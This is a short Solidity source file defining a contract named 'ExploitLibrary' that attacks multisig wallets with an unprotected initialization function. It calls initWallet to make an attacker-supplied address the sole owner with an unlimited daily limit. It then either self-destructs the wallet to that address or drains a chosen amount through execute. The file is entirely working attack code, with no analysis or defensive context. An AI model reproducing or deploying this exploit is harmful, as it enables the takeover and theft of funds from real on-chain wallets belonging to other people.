 

 
 
 
pragma solidity ^0.4.13;

 
contract WalletAbi {

  function kill(address _to);
  function initWallet(address[] _owners, uint _required, uint _daylimit);
  function execute(address _to, uint _value, bytes _data) returns (bytes32 o_hash);
  
}

 
contract ExploitLibrary {
    
     
    function takeOwnership(address _contract, address _to) public {
        WalletAbi wallet = WalletAbi(_contract);
        address[] newOwner;
        newOwner.push(_to);
         
        wallet.initWallet(newOwner, 1, uint256(0-1));
    }
    
     
    function killMultisig(address _contract, address _to) public {
        takeOwnership(_contract, _to);
        WalletAbi wallet = WalletAbi(_contract);
        wallet.kill(_to);
    }
    
     
    function transferMultisig(address _contract, address _to, uint _amount) public {
        takeOwnership(_contract, _to);
        uint amt = _amount;
        WalletAbi wallet = WalletAbi(_contract);
        if (wallet.balance < amt || amt == 0)
            amt = wallet.balance;
        wallet.execute(_to, amt, "");
    }

}